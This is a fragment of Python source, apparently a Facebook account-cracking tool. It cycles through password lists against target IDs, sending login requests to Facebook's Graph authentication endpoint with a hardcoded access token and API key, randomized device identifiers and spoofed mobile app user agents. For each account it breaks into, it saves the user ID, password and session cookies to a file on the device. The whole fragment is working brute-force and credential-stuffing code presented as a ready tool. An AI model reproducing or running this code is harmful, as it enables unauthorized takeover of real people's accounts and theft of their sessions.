    	ne = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}SMN-M2{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{B}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':accessToken,}
                headers = {
                'User-Agent':self.__UPD__(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':f'OAuth {accessToken}',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120',
                'X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = 'https://graph.facebook.com/auth/login'
                SMNt = requests.post(url,data=data,headers=headers).json()
                if "session_key" in SMNt:
                    uid = SMNt['uid']
                    cookies = ";".join(i["name"]+"="+i["value"] for i in SMNt["session_cookies"])
                    print(f"\r\r{xrxx}{R}-{G}/{B}SMN-OK{G}/ {xr}{B} {str(uid)} {G}/{B} {pas}")
                    print(f"{xrxx}{R}-{G}/{B}COOKIE{G}/  {xr}{P} "+cookies)
                    self.__lineX__()
                    open('/sdcard/SMN-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(str(uid))
                    break
                elif 'www.facebook.com' in SMNt['error']['message']:
                    uid = SMNt['error']['error_data']['uid']
                    print(f"\r\r{xrxx}{R}-{G}/{R}SMN-CP{G}/ {xr}{R} {str(uid)} {G}/{R} {pas}")
                    self.__lineX__()
                    open('/sdcard/SMN-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#__________/-UA-\__________#
    def __UPD__(self):
    	ua1 = "[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/315213325;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
    	ua2 = "[FBAN/FB4A;FBAV/378.0.0.18.112;FBBV/315613980;FBDM/{density=3.0,width=1080,height=2051};FBLC/en_US;FBRV/210081654;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    	ua3 = "[FBAN/FB4A;FBAV/385.0.0.32.114;FBBV/317016274;FBDM/{density=3.5,width=1440,height=2712};FBLC/en_US;FBRV/211985059;FBCR/Teletalk;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    	ua4 = "[FBAN/FB4A;FBAV/392.0.0.32.108;FBBV/318413147;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/210731379;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S367VL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    	ua5 = "[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/319214045;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    	__uaxx__ = random.choice([ua1,ua2,ua3,ua4,ua5])
    	__max__ = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{__uaxx__}'
    	return str(__max__)
#__________/-END-CALL-\__________#
sihab()